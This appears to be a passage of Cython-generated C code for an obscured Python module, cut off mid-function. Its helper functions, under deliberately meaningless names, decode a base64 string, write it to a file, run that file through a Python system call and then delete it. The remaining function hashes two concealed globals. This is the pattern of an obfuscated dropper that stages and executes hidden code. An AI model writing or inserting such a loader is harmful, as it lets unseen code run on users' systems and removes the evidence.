static PyObject *__pyx_pw_6source_8lambda4(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_n = 0;
  PyObject *__pyx_v_d = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda4 (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_n,&__pyx_n_s_d,0};
    PyObject* values[2] = {0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_n)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_d)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("lambda4", 1, 2, 2, 1); __PYX_ERR(0, 15, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "lambda4") < 0)) __PYX_ERR(0, 15, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 2) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
    }
    __pyx_v_n = values[0];
    __pyx_v_d = values[1];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("lambda4", 1, 2, 2, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 15, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("source.lambda4", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_lambda_funcdef_6source_lambda4(__pyx_self, __pyx_v_n, __pyx_v_d);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_7lambda4_lambda5(PyObject *__pyx_self, PyObject *__pyx_v_f); /*proto*/
static PyMethodDef __pyx_mdef_6source_7lambda4_lambda5 = {"lambda5", (PyCFunction)__pyx_pw_6source_7lambda4_lambda5, METH_O, 0};
static PyObject *__pyx_pw_6source_7lambda4_lambda5(PyObject *__pyx_self, PyObject *__pyx_v_f) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda5 (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_lambda5(__pyx_self, ((PyObject *)__pyx_v_f));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_lambda5(PyObject *__pyx_self, PyObject *__pyx_v_f) {
  struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *__pyx_cur_scope;
  struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *__pyx_outer_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda5", 0);
  __pyx_outer_scope = (struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *) __Pyx_CyFunction_GetClosure(__pyx_self);
  __pyx_cur_scope = __pyx_outer_scope;

  
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_write); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_llllll); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_b64decode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  
  if (unlikely(!__pyx_cur_scope->__pyx_v_d)) { __Pyx_RaiseClosureNameError("d"); __PYX_ERR(0, 19, __pyx_L1_error) }
  __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_d, __pyx_n_s_encode); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_7 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
    __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
    if (likely(__pyx_t_7)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_7);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_6, function);
    }
  }
  __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_5, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_flush); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_f, __pyx_n_s_close); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_3 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

  
  __pyx_t_5 = PyTuple_New(3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 17, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_3);
  __pyx_t_1 = 0;
  __pyx_t_2 = 0;
  __pyx_t_3 = 0;
  __pyx_r = __pyx_t_5;
  __pyx_t_5 = 0;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_AddTraceback("source.lambda4.lambda5", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



static PyObject *__pyx_lambda_funcdef_6source_lambda4(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_n, PyObject *__pyx_v_d) {
  struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda4", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *)__pyx_tp_new_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4(__pyx_ptype_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 15, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  __pyx_cur_scope->__pyx_v_d = __pyx_v_d;
  __Pyx_INCREF(__pyx_cur_scope->__pyx_v_d);
  __Pyx_GIVEREF(__pyx_cur_scope->__pyx_v_d);

  
  __Pyx_XDECREF(__pyx_r);

  
  __pyx_t_2 = __Pyx_CyFunction_New(&__pyx_mdef_6source_7lambda4_lambda5, 0, __pyx_n_s_lambda_locals_lambda, ((PyObject*)__pyx_cur_scope), __pyx_n_s_source, __pyx_d, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 16, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);

  
  __pyx_t_3 = PyTuple_New(2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_INCREF(__pyx_v_n);
  __Pyx_GIVEREF(__pyx_v_n);
  PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_v_n);
  __Pyx_INCREF(__pyx_n_u_wb);
  __Pyx_GIVEREF(__pyx_n_u_wb);
  PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_n_u_wb);
  __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_3, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_4);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.lambda4", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_9lambda6(PyObject *__pyx_self, PyObject *__pyx_v_f); /*proto*/
static PyMethodDef __pyx_mdef_6source_9lambda6 = {"lambda6", (PyCFunction)__pyx_pw_6source_9lambda6, METH_O, 0};
static PyObject *__pyx_pw_6source_9lambda6(PyObject *__pyx_self, PyObject *__pyx_v_f) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda6 (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_6source_lambda6(__pyx_self, ((PyObject *)__pyx_v_f));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_6source_lambda6(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_f) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda6", 0);
  __Pyx_XDECREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_lllll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_kp_u_python, __pyx_v_f); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 22, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.lambda6", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_10lambda7(PyObject *__pyx_self, PyObject *__pyx_v_n); /*proto*/
static PyMethodDef __pyx_mdef_6source_10lambda7 = {"lambda7", (PyCFunction)__pyx_pw_6source_10lambda7, METH_O, 0};
static PyObject *__pyx_pw_6source_10lambda7(PyObject *__pyx_self, PyObject *__pyx_v_n) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lambda7 (wrapper)", 0);
  __pyx_r = __pyx_lambda_funcdef_6source_lambda7(__pyx_self, ((PyObject *)__pyx_v_n));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_lambda_funcdef_6source_lambda7(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_n) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lambda7", 0);
  __Pyx_XDECREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_lllll); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_path); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_exists); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_2 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_n) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_n);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_2); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (__pyx_t_5) {
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_lllll); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_remove); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
      }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_3, __pyx_v_n) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_n);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 23, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
  } else {
    __Pyx_INCREF(Py_None);
    __pyx_t_1 = Py_None;
  }
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.lambda7", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_1lllllllllllllllllllllll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1lllllllllllllllllllllll = {"lllllllllllllllllllllll", (PyCFunction)__pyx_pw_6source_1lllllllllllllllllllllll, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1lllllllllllllllllllllll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("lllllllllllllllllllllll (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_lllllllllllllllllllllll(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_lllllllllllllllllllllll(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_combined = NULL;
  PyObject *__pyx_v_hashlib = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  int __pyx_t_7;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("lllllllllllllllllllllll", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_llllllllllllllllllll); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_lllllllllllllllllllll); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = PyNumber_Add(__pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 31, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_v_combined = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_3 = __Pyx_Import(__pyx_n_s_hashlib, 0, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_v_hashlib = __pyx_t_3;
  __pyx_t_3 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_hashlib, __pyx_n_s_sha256); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_combined, __pyx_n_s_encode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __pyx_t_6 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_6)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_6);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 33, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_5);
